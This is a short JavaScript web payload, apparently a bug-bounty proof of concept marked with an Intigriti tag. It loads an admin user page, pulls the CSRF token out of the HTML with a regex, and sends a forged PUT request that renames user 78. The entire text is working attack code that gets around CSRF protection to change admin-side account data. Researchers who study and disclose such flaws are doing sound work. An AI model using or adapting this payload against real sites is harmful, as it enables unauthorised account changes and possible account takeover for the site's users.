var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/admin/users/78',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf-token" content="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('put', '/app/admin/users/78', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('_token='+token+'&_method=PUT&name=MaelD-Intigriti-PV')
};
